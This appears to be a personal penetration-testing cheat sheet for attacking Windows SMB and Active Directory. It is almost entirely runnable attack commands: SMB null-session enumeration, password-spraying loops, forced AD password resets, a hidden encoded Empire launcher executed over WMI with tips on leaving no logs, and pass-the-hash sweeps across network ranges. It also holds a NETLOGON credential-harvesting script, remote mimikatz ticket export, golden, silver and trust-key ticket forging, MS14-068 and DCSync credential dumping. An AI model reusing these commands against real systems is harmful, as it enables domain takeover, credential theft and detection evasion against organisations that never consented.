# TODO: It's a mess...

`` Check remote target access

    ~> net use \\VAR_TARGET_HOST\C$
    ~> dir \\VAR_TARGET_HOST\C$

`` Scanning

    # NetBIOS information
    ~$ nbtscan -vh VAR_TARGET_HOST

    # Version if anything else fails
    ~$ smbver.sh

    # Check for permissions first
    ~$ smbmap -H VAR_TARGET_HOST

    # Anything more?
    ~$ enum4linux -a VAR_TARGET_HOST

    # Null session allowed?
    ~$ smbclient -N -L VAR_TARGET_HOST
    ~> net use \\VAR_TARGET_HOST\IPC$ "" /u:""

    # Search for vulns
    ~$ nmap -v -n -p 445 -sS -g 53 --script="smb-vuln-*","smb2-vuln-*" --script-args=vulns.showall VAR_TARGET_HOST

    ~$ nmap -v -n -p 139,445 -sS -g 53 --script=smb-double-pulsar-backdoor,"smb-enum-*",smb-ls,smb-mbenum,smb-os-discovery,smb-print-text,smb-psexec,smb-security-mode,smb-server-stats,"smb-vuln-*","smb2-*" --script-args=vulns.showall --script-args=unsafe=1 VAR_TARGET_HOST

`` Shares listing

    >$ net view \\VAR_TARGET_HOST /all
    ~$ smbmap -u VAR_USERNAME -p VAR_PASSWORD -H VAR_TARGET_HOST

`` Share mount

    ~$ mount -t cifs //VAR_TARGET_HOST/share /mnt/tmp -o,username=VAR_TARGET_DOMAIN/VAR_USERNAME,password=VAR_PASSWORD,vers=2.0
        # SMBv2

`` Various

    ~$ rpcclient -U "" VAR_TARGET_HOST
        srvinfo
        enumdomusers
        getdompwinfo
        querydominfo
        netshareenum
        netshareenumall
    ~$ nbtscan -r VAR_TARGET_HOST
    ~$ smbclient //VAR_TARGET_HOST/tmp
    ~$ smbclient //VAR_TARGET_HOST/ipc$
    ~$ smbclient //VAR_TARGET_HOST/admin$
    ~$ smbclient -W VAR_TARGET_DOMAIN -U user -L VAR_TARGET_HOST
    ~$ proxychains smbclient '//VAR_TARGET_HOST/C$' -U 'VAR_TARGET_DOMAIN/VAR_USERNAME%VAR_PASSWORD'

    winexe -U VAR_USERNAME //VAR_TARGET_HOST "cmd.exe" --system

## Passwordless admin?

    ~$ smbclient //VAR_TARGET_HOST/ipc$ -U Administrator

# Recursive anonymous download

    ~$ smbclient -N //VAR_TARGET_HOST/Users
    smb: \> mask ""
    smb: \> prompt
    smb: \> recurse
    smb: \> mget Directory

`` AD

## Connect

    ~$ rpcclient -U VAR_TARGET_DOMAIN/VAR_USERNAME VAR_TARGET_HOST

## Version of the target Windows machine

    ~$ rpcclient $> srvinfo

## Current domain

    ~$ enumdomains
    name:[xxxx] idx:[0x0]
    name:[Builtin] idx:[0x0]

## Enum Domain info

    ~$ rpcclient $> querydominfo
    Domain               :  xxxx
    Server               :  SOME_SERVER
    Comment              :
    Total Users          :  9043
    Total Groups         :  0
    Total Aliases        :  616
    Sequence No          :  1
    Force Logoff         : -1
    Domain Server State  :  0x1
    Server Role          :  ROLE_DOMAIN_BDC
    Unknown 3           :    0x1

## Enum Domain users

    rpcclient $> enumdomusers
    user:[administrator] rid:[0x1f4]
    user:[Guest] rid:[0x1f5]

## Enumerate specific User/ computer information by RID

    rpcclient $> queryuser 0x3601
    User Name   :   dummy_s
    Full Name   :   Dummy User

## Local Users

    ~$ lsaenumsid
    S-1-5-21-1971769256-327852233-3012798916-1014 Example\ftp_user (1)
    S-1-5-21-1971769256-327852233-3012798916-1000 Example\example_user (1)

## Reset AD user password

    rpcclient $> setuserinfo2
    Usage: setuserinfo2 username level password [password_expired]
    result was NT_STATUS_INVALID_PARAMETER

    rpcclient $> setuserinfo2 adminuser 23 'VAR_PASSWORD'
    rpcclient $>

    OR

    root@kali:~# net rpc password adminuser -U helpdesk -S VAR_IP
    Enter new password for adminuser:
    Enter helpdesk's password:

## Domain Controller attack

    dig @VAR_IP -t NS thinc.local

    rpcclient -U "" -N VAR_IP

    # Enumerate using RPC
    enumdomusers
    enumdomgroups
    querygroup 0xRID
    querygroupmem 0xRID
    queryuser 0xRID  # applies to hosts too
    queryuser 500  # 500 == Administrator

    # Before password spraying, it is very useful to determine the Windows domain password policy using a command such as "NET ACCOUNTS /DOMAIN"
    getdompwinfo
    getusrdompwinfo 0xRID

    # A single password per spraying attempt is advisable for the sole reason that you really do not want to lock accounts
    # Password spraying with rpcclient
    rpcclient -U "jdoe%PASSWORD" -c "getusername;quit" VAR_IP

    # Example of a simple shell script or command line to spray given that the "enumdomusers" output is in the "domain-users.txt" file would be as follows
    for u in `cat domain-users.txt`; do \
        echo -n "[*] user: $u" && \
        rpcclient -U "$u:PASSWORD" \
            -c "getusername;quit" VAR_IP \
    done

    # Exploring the SYSVOL
    # Assuming you have gained access to a credential
    smbclient -U "jdoe%PASSWORD" \\\\domain.corp\SYSVOL

    C:\> NET VIEW /DOMAIN
    C:\> NET GROUP "Domain Administrators" /DOMAIN

## Add a domain user

    net user username password /ADD /DOMAIN

## Enumeration

    ./windapsearch.py -d OR --dc-ip
    ./windapsearch.py --dc-ip VAR_IP -u ropnop\\ldapbind -p VAR_PASSWORD -U -G --da -c -r

## Kerberoasting

     $ python /opt/impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip VAR_IP -request

# Accessing Remote machines

## SMB connection with a host

    PS C:\> net use \\DC.xxxxxxxx.net


## Check your net connections

    PS C:> net use

## Avoiding detection with sessions

    #However, if administrator on DC.xxxxx.net runs a net session command, the connections would be detected. For that issue
    net use /delete *

    # On windows, after running this, if we execute
    //IPAddress/C$

    # we should be able to view the directory via windows explorer.

# nltest (Windows Server 2008 and Windows Server 2008 R2)

## Verify domain controllers in a domain

    nltest /dclist:xxx.example.net
    Get list of DCs in domain 'xxx.example.net' from '\\ABCDEFG.xxx.example.net'.
          ABCDEFG1.xxx.example.net        [DS] Site: XX-SriLanka
          ABCDEFG2.xxx.example.net        [DS] Site: XX-India
          ABCDEFG5.xxx.example.net [PDC]  [DS] Site: XX-Bangladesh
    The command completed successfully

## Advanced information about users

    nltest /user:"TestAdmin"
    User: User1
    Rid: 0x3eb
    Version: 0x10002

## Determine the PDC emulator for a domain

    nltest /dcname:fourthcoffee
    PDC for Domain fourthcoffee is \\fourthcoffee-dc-01
    The command completed successfully

## Show trust relationships for a domain

    The following list shows the values that you can use to filter the list of domains.

        /Primary: Returns only the domain to which the computer account belongs.
        /Forest: Returns only those domains that are in the same forest as the primary domain.
        /Direct_Out: Returns only the domains that are explicitly trusted with the primary domain.
        /Direct_In: Returns only the domains that explicitly trust the primary domain.
        /All_Trusts: Returns all trusted domains.
        /v: Displays verbose output, including any domain SIDs and GUIDs that are available.

    nltest /domain_trusts

# netdom

    netdom query {/d: | /domain:}<Domain> [{/s: | /server:}<Server>] [{/ud: | /userd:}[<Domain>\]<User> {/pd: | /passwordd}{<Password>|*}] [/verify] [/reset] [/direct] {WORKSTATION|SERVER|DC|OU|PDC|FSMO|TRUST} [{/help | /?}]

    Specifies the type of list to generate. The following list shows the possible objects:
    WORKSTATION: Queries the domain for the list of workstations.
    SERVER: Queries the domain for the list of servers.
    DC   : Queries the domain for the list of domain controllers.
    OU   : Queries the domain for the list of OUs under which the user that you specify can create a computer object.
    PDC  : Queries the domain for the current primary domain controller.
    FSMO : Queries the domain for the current list of operations master role holders. These role holders are also known as flexible single master operations (FSMO).
    TRUST: Queries the domain for the list of its trusts.

## Queries the domain for the list of workstations:

    PS C:\> netdom query /domain example.net DC
    List of domain controllers with accounts in the domain:

## Queries the domain for the current primary domain controller

    PS C:\> netdom query /domain example.net PDC
    Primary domain controller for the domain:

## Queries the domain for the current list of operations master role holders.

    PS C:\> netdom query /domain example.net FSMO
    Schema master               xxxxDC03.example.net
    Domain naming master        xxxxDC03.example.net

## Queries the domain for the list of its trusts

    PS C:\> netdom query /domain example.net TRUST
    Direction Trusted\Trusting domain      Trust type
    ========= =======================      ==========

    <->       xxxx.xxxxxx.net              Direct
    <->       xxxx.example.net             Direct
    <->       XX.XXXxXX.NET                Direct

## Queries the domain for the list of OUs

    PS C:\> netdom query /domain abc.example.net OU
    List of Organizational Units within which the specified user can create a
    machine account:

    OU=Domain Controllers,DC=abc,DC=example,DC=net
    OU=ABC-Admin,DC=abc,DC=example,DC=net

## Queries the domain for the list of servers/ workstations

    PS C:\> netdom query /domain abc.example.net WORKSTATION
    List of workstations with accounts in the domain:

    ABCDC02      ( Workstation or Server )
    ABCDC01      ( Workstation or Server )

# Powershell

## Forest Information

    PS C:\> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

## Information

    PS C:\> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

## Forest Trusts

    $ForestRootDomain = ‘lab.adsecurity.org’
    ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(‘Forest’, $ForestRootDomain)))).GetAllTrustRelationships()

## Domain Trusts

    PS C:\> ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

## Forest Global Catalogs

    PS C:\> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs

## Enterprise Services without scanning of Network

    PS C:\> get-adcomputer -filter {ServicePrincipalName -like "*TERMSRV*"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

## SPN Scanning using Powershell

    # https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1

    C:\> Powershell -nop -exec bypass -noexit (change the directory pointing towards the downloaded location)
    PS C:\> Import-Module .\Get-SPN.psm1

## Find All Servers where Domain Admins are Registered to Run Services

    Get-SPN -type group -search "Domain Admins" -List yes | Format-Table -Autosize

    # for a non domain system with domain credentials we can use the command below
    Get-SPN  -type group -search "Domain Admins" -List yes -DomainController 192.168.1.100 -Credential domainuser | Format-Table -Autosize

## Find all registered SQL Servers, Dcom, dnscache etc.

    Get-SPN  -type service -search "MSSQLSvc*" -List yes | Format-Table -Autosize

    # list of standard SPN service names
    alerter,appmgmt,browser,cifs,cisvc,clipsrv,dcom,dhcp,dmserver,dns,dnscache,eventlog,eventsystem,fax,
    http,ias,iisadmin,messenger,msiserver,mcsvc,netdde,netddedsm,netlogon,netman,nmagent,oakley,plugplay,policyagent,
    protectedstorage,rasman,remoteaccess,replicator,rpc,rpclocator,rpcss,rsvp,samss,scardsvr,scesrv,schedule,scm,seclogon,
    snmp,spooler,tapisrv,time,trksvr,trkwks,ups,w3svc,wins,www

## All the ServicePrincipalName Entries for Domain Users Matching String by executing the command as domain user or LocalSystem from a domain computer

    Get-SPN  -type user -search "*svc*" -List yes

## Discovering the Service Accounts

    PS C:\> get-aduser -filter {ServicePrincipalName -like "*"} -Properties PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

## Discovering the Computers and Domain Controllers without scanning the network

    PS C:\> get-adcomputer -filter {PrimaryGroupID -eq "515"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,Passwot,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

## Identifying the Admin Accounts

    Net Group "Domain Admins" /Domain

    # Another method is by identifying all accounts which have the attribute "AdminCount" set to 1
    PS C:\> get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf

## Finding the Admin Groups

    PS C:\> get-adgroup -filter {GroupCategory -eq ‘Security’ -AND Name -like "*admin*"}

## Domain Password Policy

    Get-ADDefaultDomainPasswordPolicy

    Net Accounts

## Identifying the Groups with Local Admin Rights to windows machines

    # Using the Powerview.PS1
    PS C:\> Get-NetGPOGroup
    get-netOU -guid "GPOName Obtained Above"
    get-adcomputer -filter * -SearchBase "Result of the above"

## AD enumeration if we have credentials of the user and a powershell prompt

    # Define username, password, Domain, etc.
    $username = 'xxxxxxxx\LDAP'
    $password = 'xxxxx'
    $DomainControllerIpAddress = '10.2.2.2'
    $LdapDn = 'DC=bitvjays,DC=local'

    # Initialize the connection
    $dn = New-Object System.DirectoryServices.DirectoryEntry ("LDAP://$($DomainControllerIpAddress):389/$LdapDn",$username,$password)
    $ds = New-object System.DirectoryServices.DirectorySearcher($dn)

    # When you are already connected to the domain machine
    $ds = [adsisearcher]""

    # Finding the Domain Name
    $ds.SearchRoot
    distinguishedName : {DC=bitvijays,DC=local}
    Path : LDAP://DC=bitvijays,DC=local

    # Finding the Computers
    PS > $ds.Filter ="((objectCategory=computer))"
    PS > $ds.FindAll() --- Provides all the objects in the AD for computers
    PS > $ds.FindOne() --- Provides one object in the AD for computers

    # Finding the Users:
    PS > $ds.Filter ="((objectCategory=user))"
    PS > $ds.FindAll()

    # Properties of the object
    $ds.FindOne().properties
    $ds.FindAll().properties

    PS > $ds.Filter ="((name=*Bob*))"
    PS > $ds.Findall()

    # Finding all users of a particular group
    $ds.filter = "(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=bitvijays,dc=local))"

## Get sessions of remote machines

    # Net session of current computer
    net session

    # Net session of remote computer
    net session \\computername

    # Using WMI (as remote admin)
    wmic:root\cli> /node:"computername" path win32_loggeduser get antecedent
    \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="axx.xxxxx"
    \\.\root\cimv2:Win32_Account.Domain="ABCROOT",Name="srv.xxxxx"

## View users in Domain / Workgroup

    net user /domain

    # WMI
    wmic useraccount list /format:list

## View machines in Domain/ Workgroup

    net view /domain

## View group in Domain / Workgroup

    Net group / domain

    # Or using global.exe
    PS C:\> .\global.exe "Domain Admins" \\domainname

## View machines affected by GPP vulnerability

    Get-GPPPassword

    # To get the computers using the passwords set by the GPP
    Get-NetOU -GUID "{31B2F340-016D-11D2-945F-00C04FB984F9}" | %{ Get-NetComputer -ADSPath $_ }

# WMI

    wmic computerystem list full /format:list
    wmic process list /format:list
    wmic ntdomain list /format:list
    wmic useraccount list /format:list
    wmic group list /format:list
    wmic sysaccount list /format:list


## Empire with WMI exec (equiv wmiexec.py)

    powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOA..truncated...

    # From Windows, we'll remotely create a process over WMI to execute that string
    wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"

    # On the victim machine, no window opened, no binary was dropped, no service was created, and unless the machine is configured to log WMI-Activity, no easily traceable log was left behind. Sexy.

## Remotely

    # Stealthy way to discover local admins on a remote machine (note that domain is the computer name):
    wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")

    # Who is logged on to a machine
    wmic /node:ordws01 path win32_loggedonuser get antecedent

    # Read nodes from a text file and execute the command on all of them
    wmic /node:@workstations.txt path win32_loggedonuser get antecedent

    # An immediate command execution under the administrative account used
    WMIC /node:REMOTECOMPUTERNAME PROCESS call create "command to run"

# WinRM (Windows Remote Management)

    # Hosted by Windows Remote Management service (svchost.exe), listens on TCP/80 or TCP/5985 and can share port with IIS.

    winrs -r:REMOTECOMPUTERNAME command to run

# Service Control Manager (SCM)

## Create and run remote service

    sc REMOTECOMPUTERNAME create myservicename binPath= executableToRun start= auto
    sc REMOTECOMPUTERNAME config existingservice binPath= executableToRun start= auto
    sc REMOTECOMPUTERNAME start myservicename

# Files

## Mount

    mount -t cifs -o username=<share user>,password=<share password>,domain=VAR_DOMAIN //WIN_PC_IP/<share name> /mnt/cifs

# Null session

# smbclient

    smbclient //VAR_IP/ipc$ -U user
    smbclient //VAR_IP/admin$ -U user

# Brute force

    medusa -h VAR_IP -u admin -P passwords.txt -M [smbnt | ssh | mssql | http]
    medusa -H hosts.txt -U users.txt -P passwords.txt -T 10 -t 5 -L -F -M smbnt
    medusa -M smbnt -C combo.txt

# PTH / remote SMB

## Remote command execution

    # Doesn't need writable share
    smbexec.py -hashes 7bfd3...52:f3e7...64af VAR_TARGET_DOMAIN/Administrator@VAR_IP

    # Stealthy
    wmiexec.py

    # Alternatives
    dcomexec.py
    psexec.py

## Browsing shares

    pth-smbclient -U Administrator%7bf...0f12:f3...xxa64af //VAR_IP/ADMIN$
    pth-smbclient -U ... //VAR_IP/C$

## Network range

    crackmapexec VAR_IP_BASE.1-254 -x whoami --timeout 5 -d VAR_TARGET_DOMAIN -u Administrator -H 7bfd3ee62...645f12:f3acbe7e...8da64af
    crackmapexec VAR_IP_BASE.1-254 -x whoami --timeout 5 -d VAR_TARGET_DOMAIN -u Administrator -H Administrator.txt

    #!/bin/bash
    IP_BASE=VAR_IP_BASE.
    DOMAIN=VAR_TARGET_DOMAIN
    USERNAME=Administrator
    HASH=7bfd3ee...50c512:f3acb...e8de1a64af
    for ip in $(seq 1 254); do
        echo "Testing $IP_BASE$ip..."
        /usr/share/doc/python-impacket/examples/smbexec.py -hashes $HASH $DOMAIN/$USERNAME@$IP_BASE$ip
    done

##

    PS> (New-Object adsisearcher((New-Object adsi("LDAP://dc.fulcrum.local","fulcrum\ldap","VAR_PASSWORD")),"(objectCategory=Computer)")).FindAll() | %{ $_.Properties.name }
    PS> (New-Object adsisearcher((New-Object adsi("LDAP://dc.fulcrum.local","fulcrum\ldap","VAR_PASSWORD")),"(info=*)")).FindAll() | %{ $_.Properties }



# Enumerating users with AD and PowerShell

    function test($u,$p) {
        (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null;
    }

    $files = @(Get-ChildItem \\dc.VAR_DOMAIN\netlogon\*.ps1);
    foreach ($file in $files) {
        $result = Select-String -Path $file -pattern "'(.*)'";
        $user = $result.Matches[0].Groups[1].Value;
        $pass = $result.Matches[1].Groups[1].Value;
        if (test "VAR_DOMAIN\$user" "$pass")) {
            echo "VAR_DOMAIN\$user $pass";
        }
    }
    PS fulcrum\[email protected] netlogon> function test($u,$p) { (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null; }; $files = @(gci \\dc.VAR_DOMAIN\netlogon\*.ps1); foreach ($file in $files) { $result = Select-String -Path $file -pattern "'(.*)'"; $user = $result.Matches[0].Groups[1].Value; $pass = $result.Matches[1].Groups[1].Value; if (test "VAR_DOMAIN\$user" "$pass") { echo "VAR_DOMAIN\$user $pass"; }; }


# Kerberos

## Execute MimiKatz remotely to export all Kerberos tickets from Admin-PC

    # Copy mimikatz to remote
    xcopy mimikatz \\admin-pc\c$\temp

    # Export tickets
    psexec.exe \\admin-pc -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" ^& "exit")

    # Copy tickets back to Victim-PC
    xcopy \\admin-pc\c$\temp c:\temp\tickets

# Pass-the-Ticket

    # From an elevated command prompt
    mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\tickets" "exit"

    # Validate the ticket was imported
    klist

    # Access contents of dc1c$ with DomainAdminUser credential
    dir \\dc1\c$

## AD forest enumeration

    # Use PowerView 2.0 and run Get-NetForestDomain or Invoke-MapDomainTrust -LDAP to recursively map all trust relationships in the forest:

    # Get the FQDN of the forest root
    ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name

    # SID of the forest root
    (New-Object System.Security.Principal.NTAccount("testlab.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value

    kerberos::golden /user:SECONDARY$ /krbtgt:8b7c904343e530c4f81c53e8f614caf7 /domain:dev.testlab.local /sid:S-1-5-21-4275052721-3205085442-2770241942 /groups:516 /sids:S-1-5-21-456218688-4216621462-1491369290-516,S-1-5-9 /id:S-1-5-21-4275052721-3205085442-2770241942-1002 /ptt

## Notes

    /rc4 – the NTLM hash for the service kerberos service account (krbtgt)
    /sid – the SID of the domain. In this example: "S-1-5-21-1473643419-774954089-2222329127"
    /sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain "S-1-5-21-1473643419-774954089-5872329127-519"

    # Often service accounts are members of Domain Admins (or equivalent) or a Domain Admin was recently logged on to the computer an attacker dump credentials from. Using these credentials, an attacker can gain access to a Domain Controller and get all domain credentials, including the KRBTGT account NTLM hash which is used to create Kerberos Golden Tickets.

## Golden

    # To summarize, once an attacker gets access to the KRBTGT password hash, they can create Golden Tickets (TGT) that provide access to anything in AD at any time.

    .\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit

    PS> klist
    Cached Tickets: (1)
        [...]
    PS> net use \\adsdc02.lab.adsecurity.org\c$\windows\ntds

## Silver

    # A Silver Ticket is a TGS (similar to TGT in format) using the target service account’s (identified by SPN mapping) NTLM password hash to encrypt and sign.

    .\mimikatz "kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt" exit

## Trust Keys

    # Dump
    .\mimikatz "privilege::debug" "lsadump::trust /patch" exit

    # Generate
    .\mimikatz "kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi" exit

    Asktgs c:\temp\tickets\EA-ADSECLABCHILD.kirbi CIFS/ADSDC02.lab.adsecurity.org
    Kirbikator lsa c:\temp\tickets\CIFS.ADSDC02.lab.adsecurity.org.kirbi
    net use \\adsdc02.adsecurity.org\admin$

## KERBEROS::PTC – pass the cache (NT6)

    # Exploiting MS14-068 with PyKEK
    ms14-068.py -u joeuser@lab.adsecurity.org -p Password -s S-1-5[...] -d adsc02.adsecurity.org
    .\mimikatz
    kerberos::ptc c:\temp\TGT_[...].ccache

## DCSync

    # Pull password data for the KRBTGT user account in the rd.adsecurity.org domain
    Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt" exit

    # Pull password data for the Administrator user account in the rd.adsecurity.org domain
    Mimikatz "lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator" exit

    # Pull password data for the ADSDC03 Domain Controller computer account in the lab.adsecurity.org domain
    Mimikatz "lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$" exit


